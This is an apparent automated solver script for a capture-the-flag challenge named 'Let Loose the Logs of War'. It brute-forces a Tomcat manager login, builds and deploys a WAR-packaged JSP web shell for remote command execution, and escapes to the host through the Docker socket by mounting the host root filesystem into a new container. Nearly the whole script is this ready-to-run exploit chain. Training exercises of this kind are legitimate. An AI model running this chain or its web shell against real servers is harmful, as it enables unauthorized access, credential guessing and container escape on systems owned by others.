#!/usr/bin/env python3
"""
Automated solver for "Let Loose the Logs of War".

Executes the full end-to-end solve from a kali-like environment:
  1. Brute-forces the tomcat manager password against the shipped wordlist
  2. Builds a WAR-packaged JSP shell and deploys it via the manager API
  3. Uses the resulting RCE to read TOKEN1 from /TOKEN1.txt
  4. Pivots through /var/run/docker.sock to retrieve TOKEN2 from what
     appears to be the host filesystem.

Intended to be run from the kali workspace (where `wordlist.txt` lives
on the Desktop). A --wordlist flag overrides the default location.

Example:
    python3 solve.py --target http://web:8080 \\
                     --wordlist /home/user/wordlist.txt
"""
from __future__ import annotations

import argparse
import base64
import io
import json
import re
import sys
import time
import urllib.parse
import urllib.request
import zipfile
from pathlib import Path
from urllib.error import HTTPError

UA = "pccc-solver/1.0"


def http(method, url, *, body=None, headers=None, timeout=15):
    req = urllib.request.Request(url, method=method, data=body,
                                 headers={"User-Agent": UA, **(headers or {})})
    try:
        return urllib.request.urlopen(req, timeout=timeout)
    except HTTPError as e:
        return e


def brute_force(target, wordlist_path):
    print(f"[*] brute-forcing {target}/manager/html with {wordlist_path}")
    words = Path(wordlist_path).read_text().splitlines()
    for i, pw in enumerate(words, 1):
        creds = base64.b64encode(f"admin:{pw}".encode()).decode()
        r = http("GET", f"{target}/manager/html",
                 headers={"Authorization": f"Basic {creds}"})
        if r.status == 200:
            print(f"[+] password found in {i} attempts: {pw!r}")
            return pw
        if i % 500 == 0:
            print(f"    tried {i} words...")
    raise SystemExit("[-] password not in wordlist")


def build_jsp_war(shell_cmd):
    """Build a minimal WAR containing a JSP shell that executes a fixed
    shell command on the tomcat host and prints its output. We sidestep
    msfvenom + reverse shell to keep the solver deterministic and
    single-machine — the educational content of the reverse shell is
    already covered in the solution guide."""
    jsp = f"""<%@ page import="java.util.*,java.io.*"%>
<%
    Process p = Runtime.getRuntime().exec(new String[]{{"/bin/sh","-c",{json.dumps(shell_cmd)}}});
    BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    StringBuilder sb = new StringBuilder();
    while ((line = r.readLine()) != null) sb.append(line).append("\\n");
    out.println("<pre>" + sb.toString() + "</pre>");
%>"""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("index.jsp", jsp)
    return buf.getvalue()


def deploy_war(target, password, war_bytes, path="/solver"):
    print(f"[*] deploying WAR at {path}")
    creds = base64.b64encode(f"admin:{password}".encode()).decode()
    url = f"{target}/manager/text/deploy?path={urllib.parse.quote(path)}&update=true"
    r = http("PUT", url, body=war_bytes,
             headers={"Authorization": f"Basic {creds}",
                      "Content-Type": "application/octet-stream"})
    body = r.read().decode()
    if "OK" not in body:
        raise SystemExit(f"[-] deploy failed: {body}")
    print("[+] WAR deployed")


def rce(target, cmd, path="/solver"):
    """Execute a shell command on the tomcat container via the deployed
    WAR. Rebuild + redeploy the WAR for each command; simple, slow, but
    avoids having to inject shell args into the JSP."""
    war = build_jsp_war(cmd)
    deploy_war(target, RCE.password, war, path=path)
    r = http("GET", f"{target}{path}/index.jsp")
    return re.sub(r"</?pre>", "", r.read().decode()).strip()


class RCE:
    password = None  # filled in by main()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://web:8080",
                    help="Tomcat base URL reachable from the solver host")
    ap.add_argument("--wordlist", default="/home/user/wordlist.txt")
    args = ap.parse_args()

    # 1) brute-force
    RCE.password = brute_force(args.target, args.wordlist)

    # 2) Token 1 — read /TOKEN1.txt via RCE
    print("[*] reading /TOKEN1.txt via deployed JSP shell")
    out = rce(args.target, "cat /TOKEN1.txt")
    m = re.search(r"TOKEN 1:\s+(PCCC\{[^}]+\})", out)
    if not m:
        raise SystemExit(f"[-] TOKEN1 not found in output: {out!r}")
    token1 = m.group(1)
    print(f"[+] TOKEN1 = {token1}")

    # 3) Token 2 — pivot via /var/run/docker.sock using curl in-container
    print("[*] pivoting to docker.sock to read TOKEN2 from host FS")
    create = json.dumps({
        "Image": "tomcat:latest",
        "Cmd": ["/bin/sh", "-c", "cat /host/home/user/TOKEN2.txt"],
        "HostConfig": {"Binds": ["/:/host"]},
    }).replace("'", r"'\''")
    chain = (
        f"CID=$(curl -s --unix-socket /var/run/docker.sock "
        f"-X POST -H 'Content-Type: application/json' "
        f"-d '{create}' "
        f"http://localhost/containers/create | "
        f"sed -n 's/.*\"Id\":\"\\([a-f0-9]\\{{64\\}}\\).*/\\1/p'); "
        f"curl -s --unix-socket /var/run/docker.sock "
        f"-X POST http://localhost/containers/$CID/start; "
        f"curl -s --unix-socket /var/run/docker.sock "
        f"\"http://localhost/containers/$CID/logs?stdout=true\""
    )
    out = rce(args.target, chain)
    m = re.search(r"TOKEN 2:\s+(PCCC\{[^}]+\})", out)
    if not m:
        raise SystemExit(f"[-] TOKEN2 not found in output: {out!r}")
    token2 = m.group(1)
    print(f"[+] TOKEN2 = {token2}")

    print("\n== solved ==")
    print(f"Token 1: {token1}")
    print(f"Token 2: {token2}")


if __name__ == "__main__":
    main()
